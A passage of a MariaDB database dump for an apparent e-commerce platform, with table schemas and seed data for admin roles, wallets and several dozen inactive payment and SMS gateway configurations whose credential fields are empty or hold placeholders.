/*M!999999\- enable the sandbox mode */ 
-- MariaDB dump 10.19  Distrib 10.11.13-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: venu
-- ------------------------------------------------------
-- Server version	10.11.13-MariaDB-0ubuntu0.24.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `add_fund_bonus_categories`
--

DROP TABLE IF EXISTS `add_fund_bonus_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `add_fund_bonus_categories` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) DEFAULT NULL,
  `description` text DEFAULT NULL,
  `bonus_type` varchar(50) NOT NULL,
  `bonus_amount` double(14,2) NOT NULL DEFAULT 0.00,
  `min_add_money_amount` double(14,2) NOT NULL DEFAULT 0.00,
  `max_bonus_amount` double(14,2) NOT NULL DEFAULT 0.00,
  `start_date_time` datetime DEFAULT NULL,
  `end_date_time` datetime DEFAULT NULL,
  `is_active` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `add_fund_bonus_categories`
--

LOCK TABLES `add_fund_bonus_categories` WRITE;
/*!40000 ALTER TABLE `add_fund_bonus_categories` DISABLE KEYS */;
/*!40000 ALTER TABLE `add_fund_bonus_categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `addon_settings`
--

DROP TABLE IF EXISTS `addon_settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `addon_settings` (
  `id` char(36) NOT NULL,
  `key_name` varchar(191) DEFAULT NULL,
  `live_values` longtext DEFAULT NULL,
  `test_values` longtext DEFAULT NULL,
  `settings_type` varchar(255) DEFAULT NULL,
  `mode` varchar(20) NOT NULL DEFAULT 'live',
  `is_active` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `additional_data` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `payment_settings_id_index` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `addon_settings`
--

LOCK TABLES `addon_settings` WRITE;
/*!40000 ALTER TABLE `addon_settings` DISABLE KEYS */;
INSERT INTO `addon_settings` VALUES
('070c6bbd-d777-11ed-96f4-0c7a158e4469','twilio','{\"gateway\":\"twilio\",\"mode\":\"live\",\"status\":\"0\",\"sid\":\"data\",\"messaging_service_sid\":\"data\",\"token\":\"data\",\"from\":\"data\",\"otp_template\":\"data\"}','{\"gateway\":\"twilio\",\"mode\":\"live\",\"status\":\"0\",\"sid\":\"data\",\"messaging_service_sid\":\"data\",\"token\":\"data\",\"from\":\"data\",\"otp_template\":\"data\"}','sms_config','live',0,NULL,'2023-08-12 07:01:29',NULL),
('070c766c-d777-11ed-96f4-0c7a158e4469','2factor','{\"gateway\":\"2factor\",\"mode\":\"live\",\"status\":\"0\",\"api_key\":\"data\",\"otp_template\":\"OTP1\"}','{\"gateway\":\"2factor\",\"mode\":\"live\",\"status\":\"0\",\"api_key\":\"data\",\"otp_template\":\"OTP1\"}','sms_config','live',0,NULL,'2025-05-11 07:50:11',NULL),
('0d8a9308-d6a5-11ed-962c-0c7a158e4469','mercadopago','{\"gateway\":\"mercadopago\",\"mode\":\"live\",\"status\":0,\"access_token\":\"\",\"public_key\":\"\"}','{\"gateway\":\"mercadopago\",\"mode\":\"live\",\"status\":0,\"access_token\":\"\",\"public_key\":\"\"}','payment_config','test',0,NULL,'2023-08-27 11:57:11','{\"gateway_title\":\"Mercadopago\",\"gateway_image\":null}'),
('0d8a9e49-d6a5-11ed-962c-0c7a158e4469','liqpay','{\"gateway\":\"liqpay\",\"mode\":\"live\",\"status\":0,\"private_key\":\"\",\"public_key\":\"\"}','{\"gateway\":\"liqpay\",\"mode\":\"live\",\"status\":0,\"private_key\":\"\",\"public_key\":\"\"}','payment_config','test',0,NULL,'2023-08-12 06:32:31','{\"gateway_title\":\"Liqpay\",\"gateway_image\":null}'),
('101befdf-d44b-11ed-8564-0c7a158e4469','paypal','{\"gateway\":\"paypal\",\"mode\":\"live\",\"status\":\"0\",\"client_id\":\"\",\"client_secret\":\"\"}','{\"gateway\":\"paypal\",\"mode\":\"live\",\"status\":\"0\",\"client_id\":\"\",\"client_secret\":\"\"}','payment_config','test',0,NULL,'2023-08-30 03:41:32','{\"gateway_title\":\"Paypal\",\"gateway_image\":null}'),
('133d9647-cabb-11ed-8fec-0c7a158e4469','hyper_pay','{\"gateway\":\"hyper_pay\",\"mode\":\"test\",\"status\":\"0\",\"entity_id\":\"data\",\"access_code\":\"data\"}','{\"gateway\":\"hyper_pay\",\"mode\":\"test\",\"status\":\"0\",\"entity_id\":\"data\",\"access_code\":\"data\"}','payment_config','test',0,NULL,'2023-08-12 06:32:42','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('1821029f-d776-11ed-96f4-0c7a158e4469','msg91','{\"gateway\":\"msg91\",\"mode\":\"live\",\"status\":\"0\",\"template_id\":\"data\",\"auth_key\":\"data\"}','{\"gateway\":\"msg91\",\"mode\":\"live\",\"status\":\"0\",\"template_id\":\"data\",\"auth_key\":\"data\"}','sms_config','live',0,NULL,'2023-08-12 07:01:48',NULL),
('18210f2b-d776-11ed-96f4-0c7a158e4469','nexmo','{\"gateway\":\"nexmo\",\"mode\":\"live\",\"status\":\"0\",\"api_key\":\"\",\"api_secret\":\"\",\"token\":\"\",\"from\":\"\",\"otp_template\":\"\"}','{\"gateway\":\"nexmo\",\"mode\":\"live\",\"status\":\"0\",\"api_key\":\"\",\"api_secret\":\"\",\"token\":\"\",\"from\":\"\",\"otp_template\":\"\"}','sms_config','live',0,NULL,'2023-04-10 02:14:44',NULL),
('18fbb21f-d6ad-11ed-962c-0c7a158e4469','foloosi','{\"gateway\":\"foloosi\",\"mode\":\"test\",\"status\":\"0\",\"merchant_key\":\"data\"}','{\"gateway\":\"foloosi\",\"mode\":\"test\",\"status\":\"0\",\"merchant_key\":\"data\"}','payment_config','test',0,NULL,'2023-08-12 06:34:33','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('2767d142-d6a1-11ed-962c-0c7a158e4469','paytm','{\"gateway\":\"paytm\",\"mode\":\"live\",\"status\":0,\"merchant_key\":\"\",\"merchant_id\":\"\",\"merchant_website_link\":\"\"}','{\"gateway\":\"paytm\",\"mode\":\"live\",\"status\":0,\"merchant_key\":\"\",\"merchant_id\":\"\",\"merchant_website_link\":\"\"}','payment_config','test',0,NULL,'2023-08-22 06:30:55','{\"gateway_title\":\"Paytm\",\"gateway_image\":null}'),
('3201d2e6-c937-11ed-a424-0c7a158e4469','amazon_pay','{\"gateway\":\"amazon_pay\",\"mode\":\"test\",\"status\":\"0\",\"pass_phrase\":\"data\",\"access_code\":\"data\",\"merchant_identifier\":\"data\"}','{\"gateway\":\"amazon_pay\",\"mode\":\"test\",\"status\":\"0\",\"pass_phrase\":\"data\",\"access_code\":\"data\",\"merchant_identifier\":\"data\"}','payment_config','test',0,NULL,'2023-08-12 06:36:07','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('33a90207-7315-4bfe-a9af-d16049cc0b7c','cashfree','\"{\\\"gateway\\\":\\\"cashfree\\\",\\\"mode\\\":\\\"test\\\",\\\"status\\\":0,\\\"client_id\\\":\\\"\\\",\\\"client_secret\\\":\\\"\\\"}\"','\"{\\\"gateway\\\":\\\"cashfree\\\",\\\"mode\\\":\\\"test\\\",\\\"status\\\":0,\\\"client_id\\\":\\\"\\\",\\\"client_secret\\\":\\\"\\\"}\"','payment_config','test',0,'2024-12-21 06:51:28','2024-12-21 06:51:28',NULL),
('4593b25c-d6a1-11ed-962c-0c7a158e4469','paytabs','{\"gateway\":\"paytabs\",\"mode\":\"live\",\"status\":0,\"profile_id\":\"\",\"server_key\":\"\",\"base_url\":\"https:\\/\\/secure-egypt.paytabs.com\\/\"}','{\"gateway\":\"paytabs\",\"mode\":\"live\",\"status\":0,\"profile_id\":\"\",\"server_key\":\"\",\"base_url\":\"https:\\/\\/secure-egypt.paytabs.com\\/\"}','payment_config','test',0,NULL,'2023-08-12 06:34:51','{\"gateway_title\":\"Paytabs\",\"gateway_image\":null}'),
('4e9b8dfb-e7d1-11ed-a559-0c7a158e4469','bkash','{\"gateway\":\"bkash\",\"mode\":\"live\",\"status\":\"0\",\"app_key\":\"\",\"app_secret\":\"\",\"username\":\"\",\"password\":\"\"}','{\"gateway\":\"bkash\",\"mode\":\"live\",\"status\":\"0\",\"app_key\":\"\",\"app_secret\":\"\",\"username\":\"\",\"password\":\"\"}','payment_config','test',0,NULL,'2023-08-12 06:39:42','{\"gateway_title\":\"Bkash\",\"gateway_image\":null}'),
('544a24a4-c872-11ed-ac7a-0c7a158e4469','fatoorah','{\"gateway\":\"fatoorah\",\"mode\":\"test\",\"status\":\"0\",\"api_key\":\"data\"}','{\"gateway\":\"fatoorah\",\"mode\":\"test\",\"status\":\"0\",\"api_key\":\"data\"}','payment_config','test',0,NULL,'2023-08-12 06:36:24','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('58c1bc8a-d6ac-11ed-962c-0c7a158e4469','ccavenue','{\"gateway\":\"ccavenue\",\"mode\":\"test\",\"status\":\"0\",\"merchant_id\":\"data\",\"working_key\":\"data\",\"access_code\":\"data\"}','{\"gateway\":\"ccavenue\",\"mode\":\"test\",\"status\":\"0\",\"merchant_id\":\"data\",\"working_key\":\"data\",\"access_code\":\"data\"}','payment_config','test',0,NULL,'2023-08-30 03:42:38','{\"gateway_title\":null,\"gateway_image\":\"2023-04-13-643783f01d386.png\"}'),
('5e2d2ef9-d6ab-11ed-962c-0c7a158e4469','thawani','{\"gateway\":\"thawani\",\"mode\":\"test\",\"status\":\"0\",\"public_key\":\"data\",\"private_key\":\"data\"}','{\"gateway\":\"thawani\",\"mode\":\"test\",\"status\":\"0\",\"public_key\":\"data\",\"private_key\":\"data\"}','payment_config','test',0,NULL,'2023-08-30 04:50:40','{\"gateway_title\":null,\"gateway_image\":\"2023-04-13-64378f9856f29.png\"}'),
('60cc83cc-d5b9-11ed-b56f-0c7a158e4469','sixcash','{\"gateway\":\"sixcash\",\"mode\":\"test\",\"status\":\"0\",\"public_key\":\"data\",\"secret_key\":\"data\",\"merchant_number\":\"data\",\"base_url\":\"data\"}','{\"gateway\":\"sixcash\",\"mode\":\"test\",\"status\":\"0\",\"public_key\":\"data\",\"secret_key\":\"data\",\"merchant_number\":\"data\",\"base_url\":\"data\"}','payment_config','test',0,NULL,'2023-08-30 04:16:17','{\"gateway_title\":null,\"gateway_image\":\"2023-04-12-6436774e77ff9.png\"}'),
('68579846-d8e8-11ed-8249-0c7a158e4469','alphanet_sms','{\"gateway\":\"alphanet_sms\",\"mode\":\"live\",\"status\":0,\"api_key\":\"\",\"otp_template\":\"\"}','{\"gateway\":\"alphanet_sms\",\"mode\":\"live\",\"status\":0,\"api_key\":\"\",\"otp_template\":\"\"}','sms_config','live',0,NULL,NULL,NULL),
('6857a2e8-d8e8-11ed-8249-0c7a158e4469','sms_to','{\"gateway\":\"sms_to\",\"mode\":\"live\",\"status\":0,\"api_key\":\"\",\"sender_id\":\"\",\"otp_template\":\"\"}','{\"gateway\":\"sms_to\",\"mode\":\"live\",\"status\":0,\"api_key\":\"\",\"sender_id\":\"\",\"otp_template\":\"\"}','sms_config','live',0,NULL,NULL,NULL),
('74c30c00-d6a6-11ed-962c-0c7a158e4469','hubtel','{\"gateway\":\"hubtel\",\"mode\":\"test\",\"status\":\"0\",\"account_number\":\"data\",\"api_id\":\"data\",\"api_key\":\"data\"}','{\"gateway\":\"hubtel\",\"mode\":\"test\",\"status\":\"0\",\"account_number\":\"data\",\"api_id\":\"data\",\"api_key\":\"data\"}','payment_config','test',0,NULL,'2023-08-12 06:37:43','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('74e46b0a-d6aa-11ed-962c-0c7a158e4469','tap','{\"gateway\":\"tap\",\"mode\":\"test\",\"status\":\"0\",\"secret_key\":\"data\"}','{\"gateway\":\"tap\",\"mode\":\"test\",\"status\":\"0\",\"secret_key\":\"data\"}','payment_config','test',0,NULL,'2023-08-30 04:50:09','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('761ca96c-d1eb-11ed-87ca-0c7a158e4469','swish','{\"gateway\":\"swish\",\"mode\":\"test\",\"status\":\"0\",\"number\":\"data\"}','{\"gateway\":\"swish\",\"mode\":\"test\",\"status\":\"0\",\"number\":\"data\"}','payment_config','test',0,NULL,'2023-08-30 04:17:02','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('7b1c3c5f-d2bd-11ed-b485-0c7a158e4469','payfast','{\"gateway\":\"payfast\",\"mode\":\"test\",\"status\":\"0\",\"merchant_id\":\"data\",\"secured_key\":\"data\"}','{\"gateway\":\"payfast\",\"mode\":\"test\",\"status\":\"0\",\"merchant_id\":\"data\",\"secured_key\":\"data\"}','payment_config','test',0,NULL,'2023-08-30 04:18:13','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('8592417b-d1d1-11ed-a984-0c7a158e4469','esewa','{\"gateway\":\"esewa\",\"mode\":\"test\",\"status\":\"0\",\"merchantCode\":\"data\"}','{\"gateway\":\"esewa\",\"mode\":\"test\",\"status\":\"0\",\"merchantCode\":\"data\"}','payment_config','test',0,NULL,'2023-08-30 04:17:38','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('888e7b84-27b3-497d-a5ef-cd69d65a798e','instamojo','\"{\\\"gateway\\\":\\\"instamojo\\\",\\\"mode\\\":\\\"test\\\",\\\"status\\\":\\\"0\\\",\\\"client_id\\\":\\\"\\\",\\\"client_secret\\\":\\\"\\\"}\"','\"{\\\"gateway\\\":\\\"instamojo\\\",\\\"mode\\\":\\\"test\\\",\\\"status\\\":\\\"0\\\",\\\"client_id\\\":\\\"\\\",\\\"client_secret\\\":\\\"\\\"}\"','payment_config','test',0,'2024-12-21 06:51:28','2024-12-21 06:51:28',NULL),
('9162a1dc-cdf1-11ed-affe-0c7a158e4469','viva_wallet','{\"gateway\":\"viva_wallet\",\"mode\":\"test\",\"status\":\"0\",\"client_id\": \"\",\"client_secret\": \"\", \"source_code\":\"\"}\n','{\"gateway\":\"viva_wallet\",\"mode\":\"test\",\"status\":\"0\",\"client_id\": \"\",\"client_secret\": \"\", \"source_code\":\"\"}\n','payment_config','test',0,NULL,NULL,NULL),
('998ccc62-d6a0-11ed-962c-0c7a158e4469','stripe','{\"gateway\":\"stripe\",\"mode\":\"live\",\"status\":\"0\",\"api_key\":null,\"published_key\":null}','{\"gateway\":\"stripe\",\"mode\":\"live\",\"status\":\"0\",\"api_key\":null,\"published_key\":null}','payment_config','test',0,NULL,'2023-08-30 04:18:55','{\"gateway_title\":\"Stripe\",\"gateway_image\":null}'),
('a3313755-c95d-11ed-b1db-0c7a158e4469','iyzi_pay','{\"gateway\":\"iyzi_pay\",\"mode\":\"test\",\"status\":\"0\",\"api_key\":\"data\",\"secret_key\":\"data\",\"base_url\":\"data\"}','{\"gateway\":\"iyzi_pay\",\"mode\":\"test\",\"status\":\"0\",\"api_key\":\"data\",\"secret_key\":\"data\",\"base_url\":\"data\"}','payment_config','test',0,NULL,'2023-08-30 04:20:02','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('a76c8993-d299-11ed-b485-0c7a158e4469','momo','{\"gateway\":\"momo\",\"mode\":\"live\",\"status\":\"0\",\"api_key\":\"data\",\"api_user\":\"data\",\"subscription_key\":\"data\"}','{\"gateway\":\"momo\",\"mode\":\"live\",\"status\":\"0\",\"api_key\":\"data\",\"api_user\":\"data\",\"subscription_key\":\"data\"}','payment_config','live',0,NULL,'2023-08-30 04:19:28','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('a8608119-cc76-11ed-9bca-0c7a158e4469','moncash','{\"gateway\":\"moncash\",\"mode\":\"test\",\"status\":\"0\",\"client_id\":\"data\",\"secret_key\":\"data\"}','{\"gateway\":\"moncash\",\"mode\":\"test\",\"status\":\"0\",\"client_id\":\"data\",\"secret_key\":\"data\"}','payment_config','test',0,NULL,'2023-08-30 04:47:34','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('ad5af1c1-d6a2-11ed-962c-0c7a158e4469','razor_pay','{\"gateway\":\"razor_pay\",\"mode\":\"live\",\"status\":\"0\",\"api_key\":null,\"api_secret\":null}','{\"gateway\":\"razor_pay\",\"mode\":\"live\",\"status\":\"0\",\"api_key\":null,\"api_secret\":null}','payment_config','test',0,NULL,'2023-08-30 04:47:00','{\"gateway_title\":\"Razor pay\",\"gateway_image\":null}'),
('ad5b02a0-d6a2-11ed-962c-0c7a158e4469','senang_pay','{\"gateway\":\"senang_pay\",\"mode\":\"live\",\"status\":\"0\",\"callback_url\":null,\"secret_key\":null,\"merchant_id\":null}','{\"gateway\":\"senang_pay\",\"mode\":\"live\",\"status\":\"0\",\"callback_url\":null,\"secret_key\":null,\"merchant_id\":null}','payment_config','test',0,NULL,'2023-08-27 09:58:57','{\"gateway_title\":\"Senang pay\",\"gateway_image\":null}'),
('b043c880-874b-4ee7-b945-b19e3bb2cabc','phonepe','\"{\\\"gateway\\\":\\\"phonepe\\\",\\\"mode\\\":\\\"test\\\",\\\"status\\\":0,\\\"merchant_id\\\":\\\"\\\",\\\"salt_Key\\\":\\\"\\\",\\\"salt_index\\\":\\\"\\\"}\"','\"{\\\"gateway\\\":\\\"phonepe\\\",\\\"mode\\\":\\\"test\\\",\\\"status\\\":0,\\\"merchant_id\\\":\\\"\\\",\\\"salt_Key\\\":\\\"\\\",\\\"salt_index\\\":\\\"\\\"}\"','payment_config','test',0,'2024-12-21 06:51:28','2024-12-21 06:51:28',NULL),
('b6c333f6-d8e9-11ed-8249-0c7a158e4469','akandit_sms','{\"gateway\":\"akandit_sms\",\"mode\":\"live\",\"status\":0,\"username\":\"\",\"password\":\"\",\"otp_template\":\"\"}','{\"gateway\":\"akandit_sms\",\"mode\":\"live\",\"status\":0,\"username\":\"\",\"password\":\"\",\"otp_template\":\"\"}','sms_config','live',0,NULL,NULL,NULL),
('b6c33c87-d8e9-11ed-8249-0c7a158e4469','global_sms','{\"gateway\":\"global_sms\",\"mode\":\"live\",\"status\":0,\"user_name\":\"\",\"password\":\"\",\"from\":\"\",\"otp_template\":\"\"}','{\"gateway\":\"global_sms\",\"mode\":\"live\",\"status\":0,\"user_name\":\"\",\"password\":\"\",\"from\":\"\",\"otp_template\":\"\"}','sms_config','live',0,NULL,NULL,NULL),
('b8992bd4-d6a0-11ed-962c-0c7a158e4469','paymob_accept','{\"gateway\":\"paymob_accept\",\"mode\":\"live\",\"status\":\"0\",\"callback_url\":null,\"api_key\":\"\",\"iframe_id\":\"\",\"integration_id\":\"\",\"hmac\":\"\",\"supported_country\":\"\",\"public_key\":\"\",\"secret_key\":\"\"}','{\"gateway\":\"paymob_accept\",\"mode\":\"live\",\"status\":\"0\",\"callback_url\":null,\"api_key\":\"\",\"iframe_id\":\"\",\"integration_id\":\"\",\"hmac\":\"\",\"supported_country\":\"\",\"public_key\":\"\",\"secret_key\":\"\"}','payment_config','test',0,NULL,'2025-05-11 07:50:11','{\"gateway_title\":\"Paymob accept\",\"gateway_image\":null}'),
('c41c0dcd-d119-11ed-9f67-0c7a158e4469','maxicash','{\"gateway\":\"maxicash\",\"mode\":\"test\",\"status\":\"0\",\"merchantId\":\"data\",\"merchantPassword\":\"data\"}','{\"gateway\":\"maxicash\",\"mode\":\"test\",\"status\":\"0\",\"merchantId\":\"data\",\"merchantPassword\":\"data\"}','payment_config','test',0,NULL,'2023-08-30 04:49:15','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('c9249d17-cd60-11ed-b879-0c7a158e4469','pvit','{\"gateway\":\"pvit\",\"mode\":\"test\",\"status\":\"0\",\"mc_tel_merchant\": \"\",\"access_token\": \"\", \"mc_merchant_code\": \"\"}','{\"gateway\":\"pvit\",\"mode\":\"test\",\"status\":\"0\",\"mc_tel_merchant\": \"\",\"access_token\": \"\", \"mc_merchant_code\": \"\"}','payment_config','test',0,NULL,NULL,NULL),
('cb0081ce-d775-11ed-96f4-0c7a158e4469','releans','{\"gateway\":\"releans\",\"mode\":\"live\",\"status\":0,\"api_key\":\"\",\"from\":\"\",\"otp_template\":\"\"}','{\"gateway\":\"releans\",\"mode\":\"live\",\"status\":0,\"api_key\":\"\",\"from\":\"\",\"otp_template\":\"\"}','sms_config','live',0,NULL,'2023-04-10 02:14:44',NULL),
('d4f3f5f1-d6a0-11ed-962c-0c7a158e4469','flutterwave','{\"gateway\":\"flutterwave\",\"mode\":\"live\",\"status\":0,\"secret_key\":\"\",\"public_key\":\"\",\"hash\":\"\"}','{\"gateway\":\"flutterwave\",\"mode\":\"live\",\"status\":0,\"secret_key\":\"\",\"public_key\":\"\",\"hash\":\"\"}','payment_config','test',0,NULL,'2023-08-30 04:41:03','{\"gateway_title\":\"Flutterwave\",\"gateway_image\":null}'),
('d822f1a5-c864-11ed-ac7a-0c7a158e4469','paystack','{\"gateway\":\"paystack\",\"mode\":\"live\",\"status\":\"0\",\"callback_url\":\"https:\\/\\/api.paystack.co\",\"public_key\":null,\"secret_key\":null,\"merchant_email\":null}','{\"gateway\":\"paystack\",\"mode\":\"live\",\"status\":\"0\",\"callback_url\":\"https:\\/\\/api.paystack.co\",\"public_key\":null,\"secret_key\":null,\"merchant_email\":null}','payment_config','test',0,NULL,'2023-08-30 04:20:45','{\"gateway_title\":\"Paystack\",\"gateway_image\":null}'),
('daec8d59-c893-11ed-ac7a-0c7a158e4469','xendit','{\"gateway\":\"xendit\",\"mode\":\"test\",\"status\":\"0\",\"api_key\":\"data\"}','{\"gateway\":\"xendit\",\"mode\":\"test\",\"status\":\"0\",\"api_key\":\"data\"}','payment_config','test',0,NULL,'2023-08-12 06:35:46','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('dc0f5fc9-d6a5-11ed-962c-0c7a158e4469','worldpay','{\"gateway\":\"worldpay\",\"mode\":\"test\",\"status\":\"0\",\"OrgUnitId\":\"data\",\"jwt_issuer\":\"data\",\"mac\":\"data\",\"merchantCode\":\"data\",\"xml_password\":\"data\"}','{\"gateway\":\"worldpay\",\"mode\":\"test\",\"status\":\"0\",\"OrgUnitId\":\"data\",\"jwt_issuer\":\"data\",\"mac\":\"data\",\"merchantCode\":\"data\",\"xml_password\":\"data\"}','payment_config','test',0,NULL,'2023-08-12 06:35:26','{\"gateway_title\":null,\"gateway_image\":\"\"}'),
('e0450278-d8eb-11ed-8249-0c7a158e4469','signal_wire','{\"gateway\":\"signal_wire\",\"mode\":\"live\",\"status\":0,\"project_id\":\"\",\"token\":\"\",\"space_url\":\"\",\"from\":\"\",\"otp_template\":\"\"}','{\"gateway\":\"signal_wire\",\"mode\":\"live\",\"status\":0,\"project_id\":\"\",\"token\":\"\",\"space_url\":\"\",\"from\":\"\",\"otp_template\":\"\"}','sms_config','live',0,NULL,NULL,NULL),
('e0450b40-d8eb-11ed-8249-0c7a158e4469','paradox','{\"gateway\":\"paradox\",\"mode\":\"live\",\"status\":\"0\",\"api_key\":\"\",\"sender_id\":\"\"}','{\"gateway\":\"paradox\",\"mode\":\"live\",\"status\":\"0\",\"api_key\":\"\",\"sender_id\":\"\"}','sms_config','live',0,NULL,'2023-09-10 01:14:01',NULL),
('ea346efe-cdda-11ed-affe-0c7a158e4469','ssl_commerz','{\"gateway\":\"ssl_commerz\",\"mode\":\"live\",\"status\":\"0\",\"store_id\":\"\",\"store_password\":\"\"}','{\"gateway\":\"ssl_commerz\",\"mode\":\"live\",\"status\":\"0\",\"store_id\":\"\",\"store_password\":\"\"}','payment_config','test',0,NULL,'2023-08-30 03:43:49','{\"gateway_title\":\"Ssl commerz\",\"gateway_image\":null}'),
('eed88336-d8ec-11ed-8249-0c7a158e4469','hubtel','{\"gateway\":\"hubtel\",\"mode\":\"live\",\"status\":0,\"sender_id\":\"\",\"client_id\":\"\",\"client_secret\":\"\",\"otp_template\":\"\"}','{\"gateway\":\"hubtel\",\"mode\":\"live\",\"status\":0,\"sender_id\":\"\",\"client_id\":\"\",\"client_secret\":\"\",\"otp_template\":\"\"}','sms_config','live',0,NULL,NULL,NULL),
('f149c546-d8ea-11ed-8249-0c7a158e4469','viatech','{\"gateway\":\"viatech\",\"mode\":\"live\",\"status\":0,\"api_url\":\"\",\"api_key\":\"\",\"sender_id\":\"\",\"otp_template\":\"\"}','{\"gateway\":\"viatech\",\"mode\":\"live\",\"status\":0,\"api_url\":\"\",\"api_key\":\"\",\"sender_id\":\"\",\"otp_template\":\"\"}','sms_config','live',0,NULL,NULL,NULL),
('f149cd9c-d8ea-11ed-8249-0c7a158e4469','019_sms','{\"gateway\":\"019_sms\",\"mode\":\"live\",\"status\":0,\"password\":\"\",\"username\":\"\",\"username_for_token\":\"\",\"sender\":\"\",\"otp_template\":\"\"}','{\"gateway\":\"019_sms\",\"mode\":\"live\",\"status\":0,\"password\":\"\",\"username\":\"\",\"username_for_token\":\"\",\"sender\":\"\",\"otp_template\":\"\"}','sms_config','live',0,NULL,NULL,NULL);
/*!40000 ALTER TABLE `addon_settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `admin_roles`
--

DROP TABLE IF EXISTS `admin_roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `admin_roles` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(30) DEFAULT NULL,
  `module_access` varchar(250) DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `admin_roles`
--

LOCK TABLES `admin_roles` WRITE;
/*!40000 ALTER TABLE `admin_roles` DISABLE KEYS */;
INSERT INTO `admin_roles` VALUES
(1,'Master Admin',NULL,1,NULL,NULL);
/*!40000 ALTER TABLE `admin_roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `admin_wallet_histories`
--

DROP TABLE IF EXISTS `admin_wallet_histories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `admin_wallet_histories` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `admin_id` bigint(20) DEFAULT NULL,
  `amount` double NOT NULL DEFAULT 0,
  `order_id` bigint(20) DEFAULT NULL,
  `product_id` bigint(20) DEFAULT NULL,
  `payment` varchar(191) NOT NULL DEFAULT 'received',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `admin_wallet_histories`
--

LOCK TABLES `admin_wallet_histories` WRITE;
/*!40000 ALTER TABLE `admin_wallet_histories` DISABLE KEYS */;
/*!40000 ALTER TABLE `admin_wallet_histories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `admin_wallets`
--

DROP TABLE IF EXISTS `admin_wallets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `admin_wallets` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `admin_id` bigint(20) DEFAULT NULL,
  `inhouse_earning` double NOT NULL DEFAULT 0,
  `withdrawn` double NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `commission_earned` double(8,2) NOT NULL DEFAULT 0.00,
  `delivery_charge_earned` double(8,2) NOT NULL DEFAULT 0.00,
  `pending_amount` double(8,2) NOT NULL DEFAULT 0.00,
  `total_tax_collected` double(8,2) NOT NULL DEFAULT 0.00,
  PRIMARY KEY (`id`)
